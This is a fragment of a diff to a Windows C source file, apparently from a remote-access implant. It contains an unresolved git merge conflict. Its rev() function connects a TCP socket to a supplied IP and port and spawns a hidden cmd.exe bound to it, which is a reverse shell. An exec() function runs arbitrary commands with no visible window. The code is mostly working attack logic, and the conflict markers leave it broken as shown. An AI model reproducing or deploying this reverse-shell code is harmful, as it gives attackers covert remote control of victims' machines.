@@ -5,10 +5,14 @@ void rev(char* ip)
 	WSADATA wsaData;
 	SOCKET wSock;
 	struct sockaddr_in hax;
-	STARTUPINFO si;
+	STARTUPINFOA si;
 	PROCESS_INFORMATION pi;
 
+<<<<<<< HEAD:process.c
 	wSock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
+=======
+	wSock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
+>>>>>>> 09a1a41 (Cleaned up code, added visual studio buildconfig):src/process.c
 
 	hax.sin_family = AF_INET;
 	hax.sin_port = htons(REV_PORT);
@@ -23,7 +27,7 @@ void rev(char* ip)
 
 	if (!CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
 	{
-#ifdef DEBUG
+#ifdef _DEBUG
 		printf("CreateProcess failed (%d).\n", GetLastError());
 #endif
 		return;
@@ -41,7 +45,7 @@ void exec(char* cmd)
 	
 	if (!CreateProcessA(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
 	{
-#ifdef DEBUG
+#ifdef _DEBUG
 		printf("CreateProcess failed (%d).\n", GetLastError());
 #endif
 		return;
